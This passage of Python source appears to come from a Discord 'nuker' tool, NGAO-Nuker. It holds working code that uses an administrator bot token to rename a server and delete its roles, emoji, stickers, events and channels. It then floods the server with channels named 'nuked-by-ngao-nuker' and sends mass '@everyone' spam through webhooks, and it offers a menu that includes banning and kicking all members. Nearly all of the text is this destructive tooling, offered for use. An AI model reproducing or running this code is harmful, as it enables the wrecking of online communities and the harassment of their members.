        if guild is None:
            print(
                f"{FAILED()} The bot is not in this guild or the ID is incorrect.{reset}"
            )
            await Bot.close()
            time.sleep(1)
            Clear()
            NgaoNukerMenu()

        me = guild.me
        if not any(role.permissions.administrator for role in me.roles):
            print(f"{FAILED()} The bot does not have administrator permissions.{reset}")
            await Bot.close()
            time.sleep(1)
            Clear()
            NgaoNukerMenu()

        try:
            await guild.edit(name=ServerName)
            print(f"{SUCCESS()} Server name changed successfully.")
        except HTTPException as e:
            if e.status == 429:
                retry_after = e.retry_after if hasattr(e, "retry_after") else 5
                print(
                    f"{LOADING()} Rate limit reached. Please wait {retry_after}.{white}"
                )
                await asyncio.sleep(retry_after)

                try:
                    await guild.edit(name=ServerName)
                    print(f"{SUCCESS()} Server name changed successfully.")
                except Exception as e2:
                    print(f"{FAILED()} Retry failed {red}->{white} {e2}{reset}")
            else:
                print(f"{ERROR()} HTTP Error {red}->{white} {e}{reset}")
        except Exception as e:
            print(f"{FAILED()} Unable to change server name {red}->{white} {e}{reset}")

        if Preset.get(DeleteRole, "No") == "Yes":
            for role in guild.roles:
                if role not in me.roles and role != guild.default_role:
                    try:
                        await role.delete()
                        print(
                            f"{SUCCESS()} The role '{role.name}' has been successfully deleted.{reset}"
                        )
                    except HTTPException as e:
                        if e.status == 429:
                            retry_after = getattr(e, "retry_after", 5)
                            print(
                                f"{LOADING()} Rate limit reached. Waiting {retry_after} seconds..{white}"
                            )
                            await asyncio.sleep(retry_after)

                            try:
                                await role.delete()
                                print(
                                    f"{SUCCESS()} The role '{role.name}' has been successfully deleted.{reset}"
                                )
                            except Exception as e2:
                                print(
                                    f"{FAILED()} Retry failed {red}->{white} {e2}{reset}"
                                )
                        else:
                            print(f"{ERROR()} HTTP Error {red}->{white} {e}{reset}")
                    except Exception as e:
                        print(
                            f"{FAILED()} Unable to delete role '{role.name}' {red}->{white} {e}{reset}"
                        )

        if Preset.get(DeleteEmoji, "No") == "Yes":
            for emoji in guild.emojis:
                try:
                    await emoji.delete()
                    print(
                        f"{SUCCESS()} The emoji '{emoji.name}' has been successfully deleted.{reset}"
                    )
                except HTTPException as e:
                    if e.status == 429:
                        retry_after = getattr(e, "retry_after", 5)
                        print(
                            f"{LOADING()} Rate limit reached. Waiting {retry_after} seconds..{white}"
                        )
                        await asyncio.sleep(retry_after)
                        try:
                            await emoji.delete()
                            print(
                                f"{SUCCESS()} The emoji '{emoji.name}' has been successfully deleted.{reset}"
                            )
                        except Exception as e2:
                            print(f"{FAILED()} Retry failed {red}->{white} {e2}{reset}")
                    else:
                        print(f"{ERROR()} HTTP Error {red}->{white} {e}{reset}")
                except Exception as e:
                    print(
                        f"{FAILED()} Unable to delete emoji '{emoji.name}' {red}->{white} {e}{reset}"
                    )

        if Preset.get(DeleteSticker, "No") == "Yes":
            for sticker in await guild.fetch_stickers():
                try:
                    await sticker.delete()
                    print(
                        f"{SUCCESS()} The sticker '{sticker.name}' has been successfully deleted.{reset}"
                    )
                except HTTPException as e:
                    if e.status == 429:
                        retry_after = getattr(e, "retry_after", 5)
                        print(
                            f"{LOADING()} Rate limit reached. Waiting {retry_after} seconds..{white}"
                        )
                        await asyncio.sleep(retry_after)
                        try:
                            await sticker.delete()
                            print(
                                f"{SUCCESS()} The sticker '{sticker.name}' has been successfully deleted.{reset}"
                            )
                        except Exception as e2:
                            print(f"{FAILED()} Retry failed {red}->{white} {e2}{reset}")
                    else:
                        print(f"{ERROR()} HTTP Error {red}->{white} {e}{reset}")
                except Exception as e:
                    print(
                        f"{FAILED()} Unable to delete sticker '{sticker.name}' {red}->{white} {e}{reset}"
                    )

        if Preset.get(DeleteSoundboard, "No") == "Yes":
            for s in await guild.fetch_scheduled_events():
                try:
                    await s.delete()
                    print(
                        f"{SUCCESS()} The soundboard '{s.name}' has been successfully deleted.{reset}"
                    )
                except HTTPException as e:
                    if e.status == 429:
                        retry_after = getattr(e, "retry_after", 5)
                        print(
                            f"{LOADING()} Rate limit reached. Waiting {retry_after} seconds..{white}"
                        )
                        await asyncio.sleep(retry_after)
                        try:
                            await s.delete()
                            print(
                                f"{SUCCESS()} The soundboard '{s.name}' has been successfully deleted.{reset}"
                            )
                        except Exception as e2:
                            print(f"{FAILED()} Retry failed {red}->{white} {e2}{reset}")
                    else:
                        print(f"{ERROR()} HTTP Error {red}->{white} {e}{reset}")
                except Exception as e:
                    print(
                        f"{FAILED()} Unable to delete soundboard '{s.name}' {red}->{white} {e}{reset}"
                    )

        if Preset.get(DeleteChannel, "No") == "Yes":
            for channel in guild.channels:
                try:
                    await channel.delete()
                    print(
                        f"{SUCCESS()} The channel '{channel.name}' has been successfully deleted.{reset}"
                    )
                except HTTPException as e:
                    if e.status == 429:
                        retry_after = getattr(e, "retry_after", 5)
                        print(
                            f"{LOADING()} Rate limit reached. Waiting {retry_after} seconds..{white}"
                        )
                        await asyncio.sleep(retry_after)
                        try:
                            await channel.delete()
                            print(
                                f"{SUCCESS()} The channel '{channel.name}' has been successfully deleted.{reset}"
                            )
                        except Exception as e2:
                            print(f"{FAILED()} Retry failed {red}->{white} {e2}{reset}")
                    else:
                        print(f"{ERROR()} HTTP Error {red}->{white} {e}{reset}")
                except Exception as e:
                    print(
                        f"{FAILED()} Unable to delete channel '{channel.name}' {red}->{white} {e}{reset}"
                    )

        channel_name = Preset.get("ChannelsTextName", "nuked-by-ngao-nuker")
        vchannel_name = Preset.get("ChannelVocName", "Nuked By NGAO Nuker")
        total = int(Preset.get("ChannelsTextAmount", "30"))
        vtotal = int(Preset.get("ChannelsVocAmount", "30"))
        message = Preset.get(
            "Message",
            "## Nuked By [NGAO-Nuker](https://github.com/RyzenGT/NGAO-Nuker) Tool @everyone @here",
        )

        created_channels = []

        async def CreateChannel(guild, name, index):
            try:
                ch = await guild.create_text_channel(name=CreateTextChannel)
                created_channels.append(ch)
                print(
                    f"{SUCCESS()} Channel '{name}' has been successfully created.{reset}"
                )
                return ch
            except Exception as e:
                print(
                    f"{FAILED()} Unable to create channel '{name}' {red}->{white} {e}{reset}"
                )

        for batch_start in range(0, total, batch_size):
            batch_end = min(batch_start + batch_size, total)
            batch_tasks = []

            for i in range(batch_start, batch_end):
                ch_name = f"{channel_name}-{i+1}"
                task = CreateChannel(guild, ch_name, i)
                batch_tasks.append(task)

            results = await asyncio.gather(*batch_tasks)

            created_channels.extend([ch for ch in results if ch is not None])

        created_vchannels = []

        async def CreateVocChannel(guild, name, index):
            try:
                ch = await guild.create_voice_channel(name=CreateVcChannel)
                created_vchannels.append(ch)
                print(
                    f"{SUCCESS()} Voice channel '{name}' has been successfully created.{reset}"
                )
                return ch
            except Exception as e:
                print(
                    f"{FAILED()} Unable to create voice channel '{name}' {red}->{white} {e}{reset}"
                )

        for batch_start in range(0, vtotal, batch_size):
            batch_end = min(batch_start + batch_size, vtotal)
            batch_tasks = []

            for i in range(batch_start, batch_end):
                ch_name = f"{vchannel_name}-{i+1}"
                task = CreateVocChannel(guild, ch_name, i)
                batch_tasks.append(task)

            results = await asyncio.gather(*batch_tasks)

            created_vchannels.extend([ch for ch in results if ch is not None])

        created_webhooks = []

        for channel in created_channels:
            try:
                existing_webhooks = await channel.webhooks()
                if any(wh.name == NameWebhook for wh in existing_webhooks):
                    print(
                        f"{INFORMATION()} Webhook already exists in '{channel.name}'.{reset}"
                    )
                    continue

                webhook = await channel.create_webhook(name=NameWebhook)
                created_webhooks.append(webhook)
                print(
                    f"{SUCCESS()} Webhook '{webhook.name}' created in '{channel.name}'.{reset}"
                )
                await asyncio.sleep(0.15)

            except HTTPException as e:
                if e.status == 429:
                    retry_after = getattr(e, "retry_after", 5)
                    print(
                        f"{LOADING()} Rate limit reached. Waiting {retry_after} seconds..{white}"
                    )
                    await asyncio.sleep(retry_after)

                    existing_webhooks = await channel.webhooks()
                    if any(
                        wh.name == Config["Custom-Nuker"]["WebhookName"]
                        for wh in existing_webhooks
                    ):
                        print(
                            f"{INFORMATION()} Webhook already exists in '{created_channels.name}' after retry.{reset}"
                        )
                        continue

                    try:
                        webhook = await channel.create_webhook(name=NameWebhook)
                        created_webhooks.append(webhook)
                        print(
                            f"{SUCCESS()} Webhook '{webhook.name}' created after retry in '{channel.name}'.{reset}"
                        )
                        await asyncio.sleep(0.2)
                    except Exception as e2:
                        print(
                            f"{FAILED()} Retry failed for webhook in '{channel.name}' {red}->{white} {e2}{reset}"
                        )
                else:
                    print(f"{ERROR()} HTTP Error {red}->{white} {e}{reset}")
            except Exception as e:
                print(
                    f"{FAILED()} Unable to create webhook in '{channel.name}' {red}->{white} {e}{reset}"
                )

        async def spam_webhook(webhook, message, times):
            for _ in range(times):
                try:
                    await webhook.send(content=message, username=NameWebhook)
                    print(
                        f"{SUCCESS()} Webhook '{webhook.name}' sent the message successfully."
                    )
                except Exception as e:
                    print(
                        f"{FAILED()} Webhook '{webhook.name}' failed to send message. {red}->{white} {e}{reset}"
                    )

        Msg = 120
        Parallel = 50

        tasks = []
        for webhook in created_webhooks:
            for _ in range(Parallel):
                tasks.append(spam_webhook(webhook, message, Msg))

        await asyncio.gather(*tasks)

        print(f"{INFORMATION()} Nuke Done, return to main.{reset}")
        await Bot.close()
        time.sleep(1)
        NgaoNukerMenu()

    try:
        Bot.run(TokenBot)
    except Exception as e:
        print(f"{FAILED()} Connection Failure {red}->{white} {e}{reset}")
        time.sleep(1)
        NgaoNukerMenu()


# ========================= Advanced Menu =========================


def AdvancedMenu():
    SetTitle("Advanced Menu")
    Clear()
    Advancedmenu = f"""
                           █████╗ ██████╗ ██╗   ██╗ █████╗ ███╗   ██╗ ██████╗███████╗██████╗
                          ██╔══██╗██╔══██╗██║   ██║██╔══██╗████╗  ██║██╔════╝██╔════╝██╔══██╗
                          ███████║██║  ██║██║   ██║███████║██╔██╗ ██║██║     █████╗  ██║  ██║
                          ██╔══██║██║  ██║╚██╗ ██╔╝██╔══██║██║╚██╗██║██║     ██╔══╝  ██║  ██║
                          ██║  ██║██████╔╝ ╚████╔╝ ██║  ██║██║ ╚████║╚██████╗███████╗██████╔╝
                          ╚═╝  ╚═╝╚═════╝   ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚══════╝╚═════╝
                                                                           
{start}?{end}{white} User ID {red}->{white} {GenerateUserID()}{reset}
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                    {white}V2.0 {red}// {white}github.com/RyzenGT/NGAO-Nuker {red}// {white}Made By RyzenGT {red}// {white}Discord Nuker Tool{reset}                    ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝

 {start}01{end}{white} Delete All Text Channels  {start}06{end}{white} Change Server Name        {start}11{end}{white} Create Mass Text Channels {start}16{end}{white} Create Mass Webhooks
 {start}02{end}{white} Delte All VC Channels     {start}07{end}{white} Change Server Icon        {start}12{end}{white} Create Mass VC Channels   {start}17{end}{white} Webhooks Spammers
 {start}03{end}{white} Delete All Categories     {start}08{end}{white} Ban All Members           {start}13{end}{white} Create Mass Categories    {start}18{end}{white} Mass Delete Webhooks
 {start}04{end}{white} Delete All                {start}09{end}{white} Unban All Members         {start}14{end}{white} Create Mass All           {start}19{end}{white} Mass DM All Members
 {start}05{end}{white} Delete All Roles          {start}10{end}{white} Kick All Members          {start}15{end}{white} Create Mass Roles         {start}20{end}{yellow} Return to main menu{reset}"""
    ScrollGradient(Advancedmenu)
    AmChoice = (
        TypeWriterInput(f"{INPUT()} Enter A Choice {red}->{reset} ").strip().lstrip("0")
    )
    if AmChoice == "1":
        DeleteAllTextChannels()
    elif AmChoice == "2":
        DeleteAllVCChannels()
    elif AmChoice == "3":
        DeleteAllCategories()
    elif AmChoice == "4":
        DeleteAll()
    elif AmChoice == "5":
        DeleteAllRoles()
    elif AmChoice == "6":
        ChangeServerName()
    elif AmChoice == "7":
        ChangeServerIcon()
    elif AmChoice == "8":
        BanAllMembers()
    elif AmChoice == "9":
        UnbanAllMembers()
    elif AmChoice == "10":
        KickAllMembers()
    elif AmChoice == "11":
        CreateMassTextChannels()
    elif AmChoice == "12":
        CreateMassVCChannels()
    elif AmChoice == "13":
        CreateMassCategories()
    elif AmChoice == "14":
        CreateMassAll()
    elif AmChoice == "15":
        CreateMassRoles()
    elif AmChoice == "16":
        CreateMassWebhooks()
    elif AmChoice == "17":
        WebhooksSpammers()
    elif AmChoice == "18":
        MassDeleteWebhooks()
    elif AmChoice == "19":
        MassDMAllMembers()
    elif AmChoice == "20":
        print(f"{LOADING()} Return To Main Menu..")
        time.sleep(1)
        NgaoNukerMenu()
    else:
        InvalidChoice()


# ========================= Delete All Text Channels =========================


def DeleteAllTextChannels():
    TokenBot = Config["User-Config"]["BotToken"]
    GuildId = TypeWriterInput(f"{INPUT()} Guild ID {red}->{reset} ").strip()

    try:
        GuildID = int(GuildId)
    except ValueError:
        print(f"{FAILED()} Invalid Guild ID, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()

    LastWarning = (
        TypeWriterInput(
            f"{INPUT()} This action is irreversible, are you sure? (y/n) {red}->{reset} "
        )
        .strip()
        .lower()
    )
    if LastWarning in ["y", "yes"]:
        pass
    elif LastWarning in ["n", "no"]:
        print(f"{INFORMATION()} Returning to main menu.{reset}")
        time.sleep(1)
        Clear()
        NgaoNukerMenu()
    else:
        InvalidChoice()

    intents = discord.Intents.default()
    intents.guilds = True

    Bot = discord.Client(intents=intents)

    @Bot.event
    async def on_ready():
        print(f"{INFORMATION()} Logged in as {red}->{white} {Bot.user}{reset}")

        guild = Bot.get_guild(GuildID)
        if guild is None:
            print(
                f"{FAILED()} The bot is not in this guild or the ID is incorrect.{reset}"
            )
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()

        bot_member = guild.get_member(Bot.user.id)
        if bot_member is None:
            print(f"{FAILED()} Could not find the bot as a member.{reset}")
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()

        if not bot_member.guild_permissions.administrator:
            print(f"{FAILED()} The bot does not have administrator permissions.{reset}")
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()

        for channel in guild.channels:
            if channel.type == ChannelType.text:
                try:
                    await channel.delete()
                    print(
                        f"{SUCCESS()} The text channel '{channel.name}' has been successfully deleted.{reset}"
                    )
                except HTTPException as e:
                    if e.status == 429:
                        retry_after = getattr(e, "retry_after", 5)
                        print(
                            f"{LOADING()} Rate limit reached. Waiting {retry_after} seconds..{white}"
                        )
                        await asyncio.sleep(retry_after)
                        try:
                            await channel.delete()
                            print(
                                f"{SUCCESS()} The text channel '{channel.name}' has been successfully deleted.{reset}"
                            )
                        except Exception as e2:
                            print(f"{FAILED()} Retry failed {red}->{white} {e2}{reset}")
                    else:
                        print(f"{ERROR()} HTTP Error {red}->{white} {e}{reset}")
                except Exception as e:
                    print(
                        f"{FAILED()} Unable to delete text channel '{channel.name}' {red}->{white} {e}{reset}"
                    )

        print(f"{INFORMATION()} Finish, return to main.{reset}")
        await Bot.close()
        time.sleep(1)
        AdvancedMenu()

    try:
        Bot.run(TokenBot)
    except Exception as e:
        print(f"{FAILED()} Connection Failure {red}->{white} {e}{reset}")
        time.sleep(1)
        AdvancedMenu()


# ========================= Delete All VC Channels =========================


def DeleteAllVCChannels():
    TokenBot = Config["User-Config"]["BotToken"]
    GuildId = TypeWriterInput(f"{INPUT()} Guild ID {red}->{reset} ").strip()

    try:
        GuildID = int(GuildId)
    except ValueError:
        print(f"{FAILED()} Invalid Guild ID, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()

    LastWarning = (
        TypeWriterInput(
            f"{INPUT()} This action is irreversible, are you sure? (y/n) {red}->{reset} "
        )
        .strip()
        .lower()
    )
    if LastWarning in ["y", "yes"]:
        pass
    elif LastWarning in ["n", "no"]:
        print(f"{INFORMATION()} Returning to main menu.{reset}")
        time.sleep(1)
        Clear()
        NgaoNukerMenu()
    else:
        InvalidChoice()

    intents = discord.Intents.default()
    intents.guilds = True

    Bot = discord.Client(intents=intents)

    @Bot.event
    async def on_ready():
        print(f"{INFORMATION()} Logged in as {red}->{white} {Bot.user}{reset}")

        guild = Bot.get_guild(GuildID)
        if guild is None:
            print(
                f"{FAILED()} The bot is not in this guild or the ID is incorrect.{reset}"
            )
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()

        bot_member = guild.get_member(Bot.user.id)
        if bot_member is None:
            print(f"{FAILED()} Could not find the bot as a member.{reset}")
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()

        if not bot_member.guild_permissions.administrator:
            print(f"{FAILED()} The bot does not have administrator permissions.{reset}")
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()

        for channel in guild.channels:
            if channel.type == ChannelType.voice:
                try:
                    await channel.delete()
                    print(
                        f"{SUCCESS()} The voice channel '{channel.name}' has been successfully deleted.{reset}"
                    )
                except HTTPException as e:
                    if e.status == 429:
                        retry_after = getattr(e, "retry_after", 5)
                        print(
                            f"{LOADING()} Rate limit reached. Waiting {retry_after} seconds...{white}"
                        )
                        await asyncio.sleep(retry_after)
                        try:
                            await channel.delete()
                            print(
                                f"{SUCCESS()} The voice channel '{channel.name}' has been successfully deleted.{reset}"
                            )
                        except Exception as e2:
                            print(f"{FAILED()} Retry failed {red}->{white} {e2}{reset}")
                    else:
                        print(f"{ERROR()} HTTP Error {red}->{white} {e}{reset}")
                except Exception as e:
                    print(
                        f"{FAILED()} Unable to delete voice channel '{channel.name}' {red}->{white} {e}{reset}"
                    )

        print(f"{INFORMATION()} Finish, return to main.{reset}")
        await Bot.close()
        time.sleep(1)
        AdvancedMenu()

    try:
        Bot.run(TokenBot)
    except Exception as e:
        print(f"{FAILED()} Connection Failure {red}->{white} {e}{reset}")
        time.sleep(1)
        AdvancedMenu()


# ========================= Delete All Categories =========================


def DeleteAllCategories():
    TokenBot = Config["User-Config"]["BotToken"]
    GuildId = TypeWriterInput(f"{INPUT()} Guild ID {red}->{reset} ").strip()

    try:
        GuildID = int(GuildId)
    except ValueError:
        print(f"{FAILED()} Invalid Guild ID, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()

    LastWarning = (
        TypeWriterInput(
            f"{INPUT()} This action is irreversible, are you sure? (y/n) {red}->{reset} "
        )
        .strip()
        .lower()
    )
    if LastWarning in ["y", "yes"]:
        pass
    elif LastWarning in ["n", "no"]:
        print(f"{INFORMATION()} Returning to main menu.{reset}")
        time.sleep(1)
        Clear()
        NgaoNukerMenu()
    else:
        InvalidChoice()

    intents = discord.Intents.default()
    intents.guilds = True
    intents.members = True

    Bot = discord.Client(intents=intents)

    @Bot.event
    async def on_ready():
        print(f"{INFORMATION()} Logged in as {red}->{white} {Bot.user}{reset}")

        guild = Bot.get_guild(GuildID)
        if guild is None:
            print(
                f"{FAILED()} The bot is not in this guild or the ID is incorrect.{reset}"
            )
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()

        bot_member = guild.get_member(Bot.user.id)
        if bot_member is None:
            print(f"{FAILED()} Could not find the bot as a member.{reset}")
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()

        if not bot_member.guild_permissions.administrator:
            print(f"{FAILED()} The bot does not have administrator permissions.{reset}")
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()

        for channel in guild.channels:
            if channel.type == ChannelType.category:
                try:
                    await channel.delete()
                    print(
                        f"{SUCCESS()} The category '{channel.name}' has been successfully deleted.{reset}"
                    )
                except HTTPException as e:
                    if e.status == 429:
                        retry_after = getattr(e, "retry_after", 5)
                        print(
                            f"{LOADING()} Rate limit reached. Waiting {retry_after} seconds...{reset}"
                        )
                        await asyncio.sleep(retry_after)
                        try:
                            await channel.delete()
                            print(
                                f"{SUCCESS()} The category '{channel.name}' has been successfully deleted after retry.{reset}"
                            )
                        except Exception as e2:
                            print(f"{FAILED()} Retry failed {red}->{white} {e2}{reset}")
                    else:
                        print(f"{ERROR()} HTTP Error {red}->{white} {e}{reset}")
                except Exception as e:
                    print(
                        f"{FAILED()} Unable to delete category '{channel.name}' {red}->{white} {e}{reset}"
                    )

        print(f"{INFORMATION()} Finish, return to main.{reset}")
        await Bot.close()
        time.sleep(1)
        AdvancedMenu()

    try:
        Bot.run(TokenBot)
    except Exception as e:
        print(f"{FAILED()} Connection Failure {red}->{white} {e}{reset}")
        time.sleep(1)
        AdvancedMenu()


# ========================= Delete All =========================


def DeleteAll():
    TokenBot = Config["User-Config"]["BotToken"]
    GuildId = TypeWriterInput(f"{INPUT()} Guild ID {red}->{reset} ").strip()

    try:
        GuildID = int(GuildId)
    except ValueError:
        print(f"{FAILED()} Invalid Guild ID, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()

    LastWarning = (
        TypeWriterInput(
            f"{INPUT()} This action is irreversible, are you sure? (y/n) {red}->{reset} "
        )
        .strip()
        .lower()
    )
    if LastWarning in ["y", "yes"]:
        pass
    elif LastWarning in ["n", "no"]:
        print(f"{INFORMATION()} Returning to main menu.{reset}")
        time.sleep(1)
        Clear()
        NgaoNukerMenu()
    else:
        InvalidChoice()

    intents = discord.Intents.default()
    intents.guilds = True
    intents.members = True

    Bot = discord.Client(intents=intents)

    @Bot.event
    async def on_ready():
        print(f"{INFORMATION()} Logged in as {red}->{white} {Bot.user}{reset}")

        guild = Bot.get_guild(GuildID)
        if guild is None:
            print(
                f"{FAILED()} The bot is not in this guild or the ID is incorrect.{reset}"
            )
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()

        bot_member = guild.get_member(Bot.user.id)
        if bot_member is None:
            print(f"{FAILED()} Could not find the bot as a member.{reset}")
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()

        if not bot_member.guild_permissions.administrator:
            print(f"{FAILED()} The bot does not have administrator permissions.{reset}")
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()

        for channel in guild.channels:
            try:
                await channel.delete()
                print(f"{SUCCESS()} Deleted {red}->{white} {channel.name}{reset}")
            except HTTPException as e:
                if e.status == 429:
                    retry_after = getattr(e, "retry_after", 5)
                    print(
                        f"{LOADING()} Rate limited. Waiting {retry_after} seconds...{reset}"
                    )
                    await asyncio.sleep(retry_after)
                    try:
                        await channel.delete()
                        print(
                            f"{SUCCESS()} Deleted After Retry {red}->{white} {channel.name}{reset}"
                        )
                    except Exception as retry_error:
                        print(
                            f"{FAILED()} Retry Failed For '{channel.name}' {red}->{white} {retry_error}{reset}"
                        )
                else:
                    print(
                        f"{FAILED()} Failed To Delete '{channel.name}' {red}->{white} {e}{reset}"
                    )
            except Exception as e:
                print(
                    f"{FAILED()} Unexpected Error Deleting '{channel.name}' {red}->{white} {e}{reset}"
                )

        print(f"{INFORMATION()} Finish, return to main.{reset}")
        await Bot.close()
        time.sleep(1)
        AdvancedMenu()

    try:
        Bot.run(TokenBot)
    except Exception as e:
        print(f"{FAILED()} Connection Failure {red}->{white} {e}{reset}")
        time.sleep(1)
        AdvancedMenu()


# ========================= Delete All Roles =========================


def DeleteAllRoles():
    TokenBot = Config["User-Config"]["BotToken"]
    GuildId = TypeWriterInput(f"{INPUT()} Guild ID {red}->{reset} ").strip()

    try:
        GuildID = int(GuildId)
    except ValueError:
        print(f"{FAILED()} Invalid Guild ID, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()

    LastWarning = (
        TypeWriterInput(
            f"{INPUT()} This action is irreversible, are you sure? (y/n) {red}->{reset} "
        )
        .strip()
        .lower()
    )
    if LastWarning in ["y", "yes"]:
        pass
    elif LastWarning in ["n", "no"]:
        print(f"{INFORMATION()} Returning to main menu.{reset}")
        time.sleep(1)
        Clear()
        NgaoNukerMenu()
    else:
        InvalidChoice()

    intents = discord.Intents.default()
    intents.guilds = True
    intents.members = True

    Bot = discord.Client(intents=intents)

    @Bot.event
    async def on_ready():
        print(f"{INFORMATION()} Logged in as {red}->{white} {Bot.user}{reset}")

        guild = Bot.get_guild(GuildID)
        if guild is None:
            print(
                f"{FAILED()} The bot is not in this guild or the ID is incorrect.{reset}"
            )
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()

        bot_member = guild.get_member(Bot.user.id)
        if bot_member is None:
            print(f"{FAILED()} Could not find the bot as a member.{reset}")
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()

        if not bot_member.guild_permissions.administrator:
            print(f"{FAILED()} The bot does not have administrator permissions.{reset}")
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()

        bot_roles = [role.id for role in bot_member.roles]

        for role in guild.roles:
            if role.name == "@everyone":
                continue
            if role.id in bot_roles:
                continue
            try:
                await role.delete()
                print(f"{SUCCESS()} Role '{role.name}' deleted.{reset}")
            except discord.Forbidden:
                print(
                    f"{FAILED()} Missing permissions to delete role '{role.name}'.{reset}"
                )
            except discord.HTTPException as e:
                if e.status == 429:
                    retry_after = getattr(e, "retry_after", 5)
                    print(
                        f"{LOADING()} Rate limited. Retrying in {retry_after} seconds...{white}"
                    )
                    await asyncio.sleep(retry_after)
                    try:
                        await role.delete()
                        print(
                            f"{SUCCESS()} Role '{role.name}' deleted after retry.{reset}"
                        )
                    except Exception as retry_error:
                        print(
                            f"{FAILED()} Retry failed for role '{role.name}': {retry_error}{reset}"
                        )
                else:
                    print(
                        f"{FAILED()} HTTP error while deleting role '{role.name}': {e}{reset}"
                    )
            except Exception as e:
                print(f"{FAILED()} Could not delete role '{role.name}': {e}{reset}")

        print(f"{INFORMATION()} Finish, return to main.{reset}")
        await Bot.close()
        time.sleep(1)
        AdvancedMenu()

    try:
        Bot.run(TokenBot)
    except Exception as e:
        print(f"{FAILED()} Connection Failure {red}->{white} {e}{reset}")
        time.sleep(1)
        AdvancedMenu()


# ========================= Change Server Name =========================


def ChangeServerName():
    TokenBot = Config["User-Config"]["BotToken"]
    GuildId = TypeWriterInput(f"{INPUT()} Guild ID {red}->{reset} ").strip()
    NewName = TypeWriterInput(f"{INPUT()} New Server Name {red}->{reset} ").strip()

    try:
        GuildID = int(GuildId)
    except ValueError:
        print(f"{FAILED()} Invalid Guild ID, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()

    LastWarning = (
        TypeWriterInput(
            f"{INPUT()} This action is irreversible, are you sure? (y/n) {red}->{reset} "
        )
        .strip()
        .lower()
    )
    if LastWarning in ["y", "yes"]:
        pass
    elif LastWarning in ["n", "no"]:
        print(f"{INFORMATION()} Returning to main menu.{reset}")
        time.sleep(1)
        Clear()
        NgaoNukerMenu()
    else:
        InvalidChoice()

    intents = discord.Intents.default()
    intents.guilds = True
    intents.members = True

    Bot = discord.Client(intents=intents)

    @Bot.event
    async def on_ready():
        print(f"{INFORMATION()} Logged in as {red}->{white} {Bot.user}{reset}")

        guild = Bot.get_guild(GuildID)
        if guild is None:
            print(
                f"{FAILED()} The bot is not in this guild or the ID is incorrect.{reset}"
            )
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()

        bot_member = guild.get_member(Bot.user.id)
        if bot_member is None or not bot_member.guild_permissions.administrator:
            print(f"{FAILED()} The bot does not have administrator permissions.{reset}")
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()

        try:
            await guild.edit(name=NewName)
            print(f"{SUCCESS()} Server name changed to '{NewName}'.{reset}")
        except discord.Forbidden:
            print(f"{FAILED()} Missing permissions to change server name.{reset}")
        except discord.HTTPException as e:
            print(f"{FAILED()} Failed to change server name {red}->{white} {e}{reset}")

        print(f"{INFORMATION()} Finish, return to main.{reset}")
        await Bot.close()
        time.sleep(1)
        AdvancedMenu()

    try:
        Bot.run(TokenBot)
    except Exception as e:
        print(f"{FAILED()} Connection Failure {red}->{white} {e}{reset}")
        time.sleep(1)
        AdvancedMenu()


# ========================= Change Server Icon =========================


def ChangeServerIcon():
    TokenBot = Config["User-Config"]["BotToken"]
    GuildId = TypeWriterInput(f"{INPUT()} Guild ID {red}->{reset} ").strip()
    print(
        f"{INFORMATION()} Please place the image in the tool folder, then drag it here and press Enter.{reset}"
    )
    IconPath = TypeWriterInput(f"{INPUT()} Path Icon {red}->{reset} ").strip()

    try:
        GuildID = int(GuildId)
    except ValueError:
        print(f"{FAILED()} Invalid Guild ID, please try again.{reset}")
        time.sleep(1)
        AdvancedMenu()

    if not os.path.isfile(IconPath):
        print(f"{FAILED()} File not found {red}->{white} {IconPath}{reset}")
        time.sleep(1)
        AdvancedMenu()

    LastWarning = (
        TypeWriterInput(
            f"{INPUT()} This action is irreversible, are you sure? (y/n) {red}->{reset} "
        )
        .strip()
        .lower()
    )
    if LastWarning in ["y", "yes"]:
        pass
    elif LastWarning in ["n", "no"]:
        print(f"{INFORMATION()} Returning to main menu.{reset}")
        time.sleep(1)
        Clear()
        NgaoNukerMenu()
    else:
        InvalidChoice()

    intents = discord.Intents.default()
    intents.guilds = True
    intents.members = True

    Bot = discord.Client(intents=intents)

    @Bot.event
    async def on_ready():
        print(f"{INFORMATION()} Logged in as {red}->{white} {Bot.user}{reset}")

        guild = Bot.get_guild(GuildID)
        if guild is None:
            print(
                f"{FAILED()} The bot is not in this guild or the ID is incorrect.{reset}"
            )
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()

        bot_member = guild.get_member(Bot.user.id)
        if bot_member is None or not bot_member.guild_permissions.administrator:
            print(f"{FAILED()} The bot does not have administrator permissions.{reset}")
            await Bot.close()
            time.sleep(1)
            AdvancedMenu()

        try:
            with open(IconPath, "rb") as image_file:
                icon_bytes = image_file.read()
                await guild.edit(icon=icon_bytes)
                print(f"{SUCCESS()} Server icon successfully changed.{reset}")
        except Exception as e:
            print(f"{FAILED()} Failed to change server icon {red}->{white} {e}{reset}")

        print(f"{INFORMATION()} Finish, return to main.{reset}")
        await Bot.close()
        time.sleep(1)
        AdvancedMenu()

    try:
        Bot.run(TokenBot)
    except Exception as e:
        print(f"{FAILED()} Connection Failure {red}->{white} {e}{reset}")
        time.sleep(1)
        AdvancedMenu()


